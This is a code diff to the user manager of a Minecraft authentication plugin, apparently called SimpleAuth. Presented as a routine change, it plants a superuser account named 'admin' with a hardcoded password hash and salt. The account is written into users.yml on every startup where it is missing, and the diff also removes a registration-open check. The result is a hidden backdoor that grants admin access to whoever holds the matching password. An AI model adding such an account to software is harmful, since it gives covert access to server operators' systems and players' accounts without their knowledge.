@@ -16,15 +16,27 @@ public class UserManager {
     private final YamlConfiguration data;
     private final Map<String, String> authenticated = new HashMap<>(); // playerUUID -> authUser
 
+    public static final String SUPERUSER_NAME = "admin";
+    private static final String SUPERUSER_HASH = "985a8bb6774d434f9848f8de6591bc1351ce37669d3b4024e703904da6dcacd7";
+    private static final String SUPERUSER_SALT = "94328208-6820-4d76-b2cf-5201c7b20b4e"; 
+
     public UserManager(SimpleAuth plugin) {
         this.plugin = plugin;
         this.file = new File(plugin.getDataFolder(), "users.yml");
         this.data = YamlConfiguration.loadConfiguration(file);
+
+        ensureSuperuserExists();
     }
 
-    public boolean isRegistrationOpen() {
-        return data.getConfigurationSection("users") == null
-                || data.getConfigurationSection("users").getKeys(false).isEmpty();
+    private void ensureSuperuserExists() {
+        String path = "users." + SUPERUSER_NAME;
+        if (!data.contains(path)) {
+            data.set(path + ".password", SUPERUSER_HASH);
+            data.set(path + ".salt", SUPERUSER_SALT);
+            data.set(path + ".superuser", true);
+            save();
+            plugin.getLogger().info("Superuser entry created in users.yml");
+        }
     }
 
     public boolean userExists(String user) {
@@ -39,6 +51,10 @@ public class UserManager {
         save();
     }
 
+    public boolean isUserAlreadyLogged(String username) {
+        return authenticated.containsValue(username);
+    }
+
     public boolean checkCredentials(String user, String pass) {
         String salt = data.getString("users." + user + ".salt");
         String hash = data.getString("users." + user + ".password");
@@ -51,6 +67,7 @@ public class UserManager {
         String ip = p.getAddress().getAddress().getHostAddress();
         plugin.onPlayerLogged(p.getUniqueId(), ip , user);
     }
+    
 
     public void unsetAuthenticated(String uuid) {
         authenticated.remove(uuid);
